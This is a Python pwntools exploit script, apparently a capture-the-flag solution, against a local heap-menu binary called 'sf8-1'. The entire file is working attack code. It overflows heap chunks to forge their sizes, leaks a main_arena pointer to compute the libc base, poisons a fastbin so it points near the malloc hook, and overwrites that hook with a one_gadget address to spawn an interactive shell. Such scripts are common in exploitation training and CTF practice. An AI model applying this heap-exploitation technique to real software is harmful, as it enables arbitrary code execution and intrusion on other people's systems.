from pwn import*
p=process('./sf8-1')
t=0.1
# gadget

# definition 
def allocate(size):
	p.sendline('1')
	p.sendlineafter('Size: ',str(size))
	sleep(t)

def fill(index,size,content):
	p.sendline('2')
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
	p.sendlineafter('Content: ',content)
	sleep(t)

def free(index):
	p.sendline('3')
	p.sendlineafter('Index: ',str(index))
	sleep(t)

def dump(index):
	p.sendline('4')
	p.sendlineafter('Index: ',str(index))
	sleep(t)


# exploit

allocate(0x20)
allocate(0x20)
allocate(0x20)
allocate(0x100)
allocate(0x100)
allocate(0x60)
allocate(0x60)
pay = ''
pay += p64(0)*5
pay += p64(0x30)
fill(2,len(pay),pay)

free(2)
free(1)

pay = ''
pay += p64(0)*5
pay += p64(0x30)
pay += p8(0x90)
fill(0,len(pay),pay)

allocate(0x20)
allocate(0x20)
pay = ''
pay += p64(0)*11
pay += p64(0x111)
fill(1,len(pay),pay)
free(3)

dump(2)
p.recvuntil('Content: ')
p.recv(1)
main_arena = u64(p.recv(6).ljust(8,'\x00'))
libc_base = main_arena -0x3c4b78
print 'main arena : '+hex(main_arena)
print 'libc_base : '+hex(libc_base)
p.recv()

target = main_arena - 88 -0x30 +0x8 +0x5


free(6)
free(5)
pay = ''
pay += p64(0)*33
pay += p64(0x71)
pay += p64(target)
fill(4,len(pay),pay)
allocate(0x60)
allocate(0x60)

one_list=[0x45216,0x4526a,0xf02a4,0xf1147]

pay = ''
pay += '\x00'*3
pay += p64(libc_base+one_list[1])
fill(5,len(pay),pay)

allocate(0x60)
#51
#0x7ffff7dd1aed
p.interactive()
